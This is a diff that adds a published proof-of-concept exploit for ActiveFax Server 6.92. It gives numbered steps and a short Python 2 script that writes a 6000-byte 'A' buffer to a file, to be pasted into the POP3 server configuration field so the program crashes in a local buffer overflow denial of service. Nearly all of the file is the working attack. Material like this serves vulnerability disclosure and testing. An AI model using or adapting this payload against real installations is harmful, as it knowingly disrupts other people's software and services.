@@ -1,0 +1,31 @@
+# Exploit Title: ActiveFax Server 6.92 Build 0316 - 'POP3 Server' Denial of Service
+# Date: 2019-10-12
+# Vendor Homepage: https://www.actfax.com/
+# Software Link :  https://www.actfax.com/download/actfax_setup_x64_ge.exe
+# Exploit Author: Achilles
+# Tested Version: 6.92
+# Tested on: Windows 7 x64
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+ 
+# Steps to Produce the Crash: 
+# 1.- Run python code : ActiveFax_Server.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open ActiveFaxServer.exe
+# 4.- Open the Pop3 Server Config
+# 5.- Press New
+# 6.- Paste the content of EVIL.txt into the field: 'POP3 Server Address and Login and Password'
+# 7.- Press ok Twice
+# 8.- And you will see a crash.
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 6000
+
+try:
+	f=open("Evil.txt","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
